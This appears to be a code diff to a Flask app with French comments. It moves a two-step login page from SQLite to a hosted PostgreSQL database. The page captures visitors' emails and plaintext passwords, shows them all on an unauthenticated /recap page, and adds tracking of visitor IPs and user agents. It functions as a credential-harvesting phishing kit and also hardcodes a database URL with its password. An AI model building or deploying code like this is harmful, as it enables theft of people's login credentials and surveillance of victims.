@@ -1,25 +1,52 @@
 from flask import Flask, request, render_template, redirect, session
-import sqlite3
+import psycopg2
+from psycopg2.extras import RealDictCursor
 from datetime import datetime
 import os
 
 app = Flask(__name__)
 app.secret_key = "ceci_est_une_clé_secrète_à_modifier"
-DB_FILE = "data.db"
 
-# Initialisation de la base SQLite
+DATABASE_URL = "postgresql://admin:wRGvLO4UKrNf7Uq7t0nbXoDTpKPkL4rJ@dpg-cvufunmuk2gs738bgifg-a.frankfurt-postgres.render.com/logins_pezw"
+
+def get_db():
+    return psycopg2.connect(DATABASE_URL, cursor_factory=RealDictCursor)
+
 def init_db():
-    with sqlite3.connect(DB_FILE) as conn:
-        c = conn.cursor()
-        c.execute("""
-            CREATE TABLE IF NOT EXISTS logins (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                timestamp TEXT,
-                email TEXT,
-                password TEXT
-            )
-        """)
+    with get_db() as conn:
+        with conn.cursor() as c:
+            c.execute("""
+                CREATE TABLE IF NOT EXISTS logins (
+                    id SERIAL PRIMARY KEY,
+                    timestamp TEXT,
+                    email TEXT,
+                    password TEXT
+                )
+            """)
+            c.execute("""
+                CREATE TABLE IF NOT EXISTS visits (
+                    id SERIAL PRIMARY KEY,
+                    timestamp TEXT,
+                    ip TEXT,
+                    user_agent TEXT
+                )
+            """)
         conn.commit()
+
+@app.before_request
+def track_visit():
+    if request.endpoint not in ("static",):
+        with get_db() as conn:
+            with conn.cursor() as c:
+                c.execute(
+                    "INSERT INTO visits (timestamp, ip, user_agent) VALUES (%s, %s, %s)",
+                    (
+                        datetime.now().isoformat(timespec='seconds'),
+                        request.remote_addr,
+                        request.headers.get("User-Agent")
+                    )
+                )
+            conn.commit()
 
 @app.route("/", methods=["GET"])
 def home():
@@ -33,9 +60,9 @@ def step1():
     session["email"] = email
     session["timestamp"] = timestamp
 
-    with sqlite3.connect(DB_FILE) as conn:
-        c = conn.cursor()
-        c.execute("INSERT INTO logins (timestamp, email, password) VALUES (?, ?, ?)", (timestamp, email, ""))
+    with get_db() as conn:
+        with conn.cursor() as c:
+            c.execute("INSERT INTO logins (timestamp, email, password) VALUES (%s, %s, %s)", (timestamp, email, ""))
         conn.commit()
 
     return render_template("password.html", email=email)
@@ -46,9 +73,12 @@ def step2():
     timestamp = session.get("timestamp")
     password = request.form.get("password")
 
-    with sqlite3.connect(DB_FILE) as conn:
-        c = conn.cursor()
-        c.execute("UPDATE logins SET password = ? WHERE timestamp = ? AND email = ? AND password = ''", (password, timestamp, email))
+    with get_db() as conn:
+        with conn.cursor() as c:
+            c.execute("""
+                UPDATE logins SET password = %s
+                WHERE timestamp = %s AND email = %s AND password = ''
+            """, (password, timestamp, email))
         conn.commit()
 
     session.clear()
@@ -56,15 +86,27 @@ def step2():
 
 @app.route("/recap", methods=["GET"])
 def recap():
-    rows = []
-    with sqlite3.connect(DB_FILE) as conn:
-        c = conn.cursor()
-        c.execute("SELECT timestamp, email, password FROM logins")
-        rows = c.fetchall()
+    with get_db() as conn:
+        with conn.cursor() as c:
+            c.execute("SELECT timestamp, email, password FROM logins")
+            rows = c.fetchall()
 
     table_html = "<h2>Récapitulatif des tentatives</h2><table border='1'><tr><th>Horodatage</th><th>Email</th><th>Mot de passe</th></tr>"
     for row in rows:
-        table_html += "<tr>" + "".join(f"<td>{cell}</td>" for cell in row) + "</tr>"
+        table_html += f"<tr><td>{row['timestamp']}</td><td>{row['email']}</td><td>{row['password']}</td></tr>"
+    table_html += "</table>"
+    return table_html
+
+@app.route("/visites", methods=["GET"])
+def visites():
+    with get_db() as conn:
+        with conn.cursor() as c:
+            c.execute("SELECT timestamp, ip, user_agent FROM visits ORDER BY id DESC LIMIT 50")
+            rows = c.fetchall()
+
+    table_html = "<h2>Dernières visites</h2><table border='1'><tr><th>Horodatage</th><th>IP</th><th>User-Agent</th></tr>"
+    for row in rows:
+        table_html += f"<tr><td>{row['timestamp']}</td><td>{row['ip']}</td><td>{row['user_agent']}</td></tr>"
     table_html += "</table>"
     return table_html
 
